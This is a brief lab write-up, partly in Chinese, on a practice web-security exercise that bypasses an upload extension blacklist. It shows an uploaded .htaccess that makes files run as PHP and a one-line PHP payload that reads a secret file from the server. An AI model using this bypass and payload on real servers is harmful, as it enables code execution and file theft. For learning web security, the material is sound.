# Lab: Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## File Upload
* 這一題看一下提示說要上傳兩個檔案，意思就是一個是要上傳 .htaccess，另一個隨便
```
// .htaccess
SetHandler application/x-httpd-php
```
```
// a.php5
payload = <?php readfile("/home/carlos/secret"); ?>
```